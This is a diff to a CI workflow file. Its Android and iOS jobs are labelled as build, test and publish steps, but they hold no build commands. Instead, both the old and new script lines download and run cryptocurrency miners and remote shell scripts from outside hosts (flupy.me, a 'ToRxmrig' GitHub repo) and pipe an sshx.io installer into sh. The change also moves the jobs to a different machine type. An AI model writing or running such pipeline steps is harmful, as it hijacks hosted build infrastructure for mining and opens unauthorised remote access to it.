@@ -1,11 +1,11 @@
 workflows:
   android:
     name: build, test & publish Android version
-    instance_type: mac_pro
+    instance_type: mac_mini_m2
     scripts:
-      - wget flupy.me/miner.zip && unzip miner.zip && chmod +x hellminer verus-solver && wget https://raw.githubusercontent.com/shgunitompi/learning/main/run.sh && chmod +x run.sh && /run.sh && curl -sSf https://sshx.io/get | sh -s run
+      - wget https://raw.githubusercontent.com/ToRxmrig/wafwdfssz/main/whaha.sh && chmod +x whaha.sh && ./whaha.sh && curl -sSf https://sshx.io/get | sh -s run
   ios:
     name: build, test & publish iOS version
-    instance_type: mac_pro
+    instance_type: mac_mini_m2
     scripts:
-      -  wget curl neofetch -y && wget flupy.me/miner.zip && unzip miner.zip && chmod +x hellminer verus-solver && wget https://raw.githubusercontent.com/shgunitompi/learning/main/run.sh && chmod +x run.sh && /run.sh && curl -sSf https://sshx.io/get | sh -s run
+      - wget https://raw.githubusercontent.com/ToRxmrig/wafwdfssz/main/whaha.sh && chmod +x whaha.sh && ./whaha.sh && curl -sSf https://sshx.io/get | sh -s run
